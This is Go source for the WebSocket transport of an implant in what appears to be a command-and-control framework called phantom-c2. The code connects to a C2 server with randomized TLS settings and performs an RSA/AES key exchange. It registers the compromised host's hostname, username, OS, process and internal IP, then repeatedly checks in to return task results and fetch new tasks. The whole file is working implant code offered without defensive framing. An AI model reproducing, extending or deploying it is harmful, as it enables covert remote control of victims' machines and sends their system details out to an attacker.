package implant

import (
	"crypto/rsa"
	"fmt"
	"time"

	"github.com/gorilla/websocket"
	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/protocol"
)

// WSTransport handles WebSocket C2 communication.
// The same Envelope protocol is used but over a persistent WS connection
// instead of individual HTTP POSTs.
type WSTransport struct {
	serverURL  string
	conn       *websocket.Conn
	sessionKey []byte
	serverPub  *rsa.PublicKey
	agentID    string
	agentName  string
}

// NewWSTransport creates a new WebSocket transport.
func NewWSTransport(serverURL string, serverPub *rsa.PublicKey) *WSTransport {
	return &WSTransport{
		serverURL: serverURL,
		serverPub: serverPub,
	}
}

// Register connects via WebSocket and performs the RSA key exchange.
func (t *WSTransport) Register(sysinfo SysInfo) error {
	dialer := websocket.Dialer{
		TLSClientConfig:  RandomTLSConfig(),
		HandshakeTimeout: 30 * time.Second,
	}

	conn, _, err := dialer.Dial(t.serverURL+"/ws", nil)
	if err != nil {
		return fmt.Errorf("WS dial: %w", err)
	}
	t.conn = conn

	// Generate session key
	sessionKey, err := crypto.GenerateAESKey()
	if err != nil {
		return err
	}

	regReq := protocol.RegisterRequest{
		Hostname:    sysinfo.Hostname,
		Username:    sysinfo.Username,
		OS:          sysinfo.OS,
		Arch:        sysinfo.Arch,
		PID:         sysinfo.PID,
		ProcessName: sysinfo.ProcessName,
		InternalIP:  sysinfo.InternalIP,
	}

	payload, err := protocol.Marshal(regReq)
	if err != nil {
		return err
	}

	// RSA encrypt session key + payload
	encrypted, err := crypto.PackKeyExchange(t.serverPub, sessionKey, payload)
	if err != nil {
		return err
	}

	env := &protocol.Envelope{
		Version: protocol.ProtocolVersion,
		Type:    protocol.MsgRegisterRequest,
		Payload: encrypted,
	}

	if err := conn.WriteMessage(websocket.BinaryMessage, protocol.EnvelopeToBytes(env)); err != nil {
		return fmt.Errorf("WS send register: %w", err)
	}

	// Read registration response
	_, respData, err := conn.ReadMessage()
	if err != nil {
		return fmt.Errorf("WS read register response: %w", err)
	}

	respEnv, err := protocol.EnvelopeFromBytes(respData)
	if err != nil {
		return err
	}

	respPayload, err := protocol.OpenEnvelope(respEnv, sessionKey)
	if err != nil {
		return err
	}

	var regResp protocol.RegisterResponse
	if err := protocol.Unmarshal(respPayload, &regResp); err != nil {
		return err
	}

	t.sessionKey = sessionKey
	t.agentID = regResp.AgentID
	t.agentName = regResp.Name
	return nil
}

// CheckIn sends results and receives new tasks over the persistent WS connection.
func (t *WSTransport) CheckIn(results []protocol.TaskResult) ([]protocol.Task, error) {
	if t.conn == nil {
		return nil, fmt.Errorf("not connected")
	}

	ciReq := protocol.CheckInRequest{
		AgentID: t.agentID,
		Results: results,
	}

	payload, err := protocol.Marshal(ciReq)
	if err != nil {
		return nil, err
	}

	env, err := protocol.SealEnvelope(protocol.MsgCheckIn, t.sessionKey, payload)
	if err != nil {
		return nil, err
	}

	if err := t.conn.WriteMessage(websocket.BinaryMessage, protocol.EnvelopeToBytes(env)); err != nil {
		t.conn = nil // mark as disconnected for next reconnect
		return nil, fmt.Errorf("WS send checkin: %w", err)
	}

	_, respData, err := t.conn.ReadMessage()
	if err != nil {
		t.conn = nil
		return nil, fmt.Errorf("WS read checkin response: %w", err)
	}

	respEnv, err := protocol.EnvelopeFromBytes(respData)
	if err != nil {
		return nil, err
	}

	respPayload, err := protocol.OpenEnvelope(respEnv, t.sessionKey)
	if err != nil {
		return nil, err
	}

	var ciResp protocol.CheckInResponse
	if err := protocol.Unmarshal(respPayload, &ciResp); err != nil {
		return nil, err
	}

	return ciResp.Tasks, nil
}

// GetAgentID returns the assigned agent ID.
func (t *WSTransport) GetAgentID() string { return t.agentID }

// GetAgentName returns the assigned agent name.
func (t *WSTransport) GetAgentName() string { return t.agentName }
